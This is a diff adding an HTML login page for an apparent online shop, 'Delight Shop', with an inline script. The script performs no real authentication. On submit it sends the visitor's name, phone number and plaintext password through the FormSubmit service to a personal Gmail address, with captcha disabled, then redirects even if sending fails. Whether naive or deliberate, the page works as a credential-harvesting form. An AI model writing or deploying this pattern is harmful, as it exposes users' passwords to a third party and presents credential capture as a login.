@@ -1,0 +1,81 @@
+<!DOCTYPE html> 
+<html>  
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" type="text/css" href="login.css">
+  <title>www.delight.pk</title>  
+</head>  
+<body>
+  <div class="delight">
+    <h2>Hy👋</h2>
+    <h2>WELCOME TO</h2>
+    <h1>DELIGHT SHOP🛍</h1>
+  </div>
+
+  <div class="logo">
+    <img src="Logo.png" width="200" height="200" alt="Delight.logo">
+  </div>
+
+  <div class="login">
+    <h3>Login</h3>
+
+    <!-- FormSubmit Integrated Form -->
+    <form id="loginForm">
+      <input type="text" id="name" required placeholder="Enter your name"><br>
+      <input type="number" id="phone" required placeholder="Enter your phone number" minlength="11" maxlength="11"><br>
+      <input type="password" id="pass" required placeholder="Enter your password" minlength="6"><br>
+      <input type="submit" value="Login">
+    </form>
+
+    <p style="margin-top:12px; font-size:13px; text-align:center;">
+      Don’t have an account?  
+      <a href="signup.html" 
+         style="color:#ef6c00; text-decoration:none; font-weight:bold;">
+        📝 Sign Up
+      </a>
+    </p>
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+
+    form.addEventListener("submit", function(event){
+      event.preventDefault();
+
+      const name = document.getElementById("name").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const pass = document.getElementById("pass").value.trim();
+
+      if(name && phone.length===11 && pass.length>=6){
+        // Save locally
+        localStorage.setItem("username", name);
+
+        // FormSubmit
+        const formData = new FormData();
+        formData.append('name', name);
+        formData.append('phone', phone);
+        formData.append('pass', pass);
+        formData.append('_captcha','false');
+        formData.append('_next','supplierName.html'); // redirect after email
+
+        fetch('https://formsubmit.co/araindaniyalo2@gmail.com', {
+          method: 'POST',
+          body: formData
+        })
+        .then(() => {
+          window.location.href = "supplierName.html";
+        })
+        .catch(err => {
+          console.error(err);
+          alert("⚠️ Email not sent, but login will continue.");
+          window.location.href = "supplierName.html";
+        });
+
+      } else {
+        alert("Please enter valid login details!");
+      }
+    });
+  </script>
+</body>
+</html>
